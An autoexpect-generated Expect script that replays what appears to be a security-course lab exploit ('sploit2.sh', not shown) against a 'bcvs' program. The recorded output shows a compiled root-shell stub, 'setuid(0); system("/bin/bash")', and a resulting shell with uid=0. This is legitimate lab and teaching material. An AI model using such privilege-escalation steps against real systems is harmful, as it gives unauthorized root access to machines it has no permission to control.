#!/usr/bin/expect -f
#
# This Expect script was generated by autoexpect on Fri Oct 23 23:45:24 2020
# Expect and autoexpect were both written by Don Libes, NIST.
#
# Note that autoexpect does not guarantee a working script.  It
# necessarily has to guess about certain things.  Two reasons a script
# might fail are:
#
# 1) timing - A surprising number of programs (rn, ksh, zsh, telnet,
# etc.) and devices discard or ignore keystrokes that arrive "too
# quickly" after prompts.  If you find your new script hanging up at
# one spot, try adding a short sleep just before the previous send.
# Setting "force_conservative" to 1 (see below) makes Expect do this
# automatically - pausing briefly before sending each character.  This
# pacifies every program I know of.  The -c flag makes the script do
# this in the first place.  The -C flag allows you to define a
# character to toggle this mode off and on.

set force_conservative 0  ;# set to 1 to force conservative mode even if
			  ;# script wasn't run conservatively originally
if {$force_conservative} {
	set send_slow {1 .1}
	proc send {ignore arg} {
		sleep .1
		exp_send -s -- $arg
	}
}

#
# 2) differing output - Some programs produce different output each time
# they run.  The "date" command is an obvious example.  Another is
# ftp, if it produces throughput statistics at the end of a file
# transfer.  If this causes a problem, delete these patterns or replace
# them with wildcards.  An alternative is to use the -p flag (for
# "prompt") which makes Expect only look for the last line of output
# (i.e., the prompt).  The -P flag allows you to define a character to
# toggle this mode off and on.
#
# Read the man page for more info.
#
# -Don


set timeout -1
spawn ./sploit2.sh
match_max 100000
expect -exact "\[01m\[Kchown.c:\[m\[K In function â€˜\[01m\[Kmain\[m\[Kâ€™:\r
\[01m\[Kchown.c:1:12:\[m\[K \[01;35m\[Kwarning: \[m\[Kimplicit declaration of function â€˜\[01m\[Ksetuid\[m\[Kâ€™ \[\[01;35m\[K-Wimplicit-function-declaration\[m\[K\]\r
    1 | int main(){\[01;35m\[Ksetuid\[m\[K(0); system(\"/bin/bash\"); return 0;}\r
      |            \[01;35m\[K^~~~~~\[m\[K\r
\[01m\[Kchown.c:1:23:\[m\[K \[01;35m\[Kwarning: \[m\[Kimplicit declaration of function â€˜\[01m\[Ksystem\[m\[Kâ€™ \[\[01;35m\[K-Wimplicit-function-declaration\[m\[K\]\r
    1 | int main(){setuid(0); \[01;35m\[Ksystem\[m\[K(\"/bin/bash\"); return 0;}\r
      |                       \[01;35m\[K^~~~~~\[m\[K\r
Please write a SHORT explanation:\r
"
send -- "Gotcha!\r"
expect -exact "Gotcha!\r
Gotcha!\r
written to log.\r
Please write a SHORT explanation:\r
"
send -- "Gotcha!\r"
expect -exact "Gotcha!\r
Gotcha!\r
written to log.\r
\[root@security bcvs\]# "
send -- "id\r"
expect -exact "id\r
uid=0(root) gid=1000(student) groups=1000(student)\r
\[root@security bcvs\]# "
send -- "exit\r"
expect -exact "exit\r
exit\r
\[root@security bcvs\]# "
send -- "exit\r"
expect eof
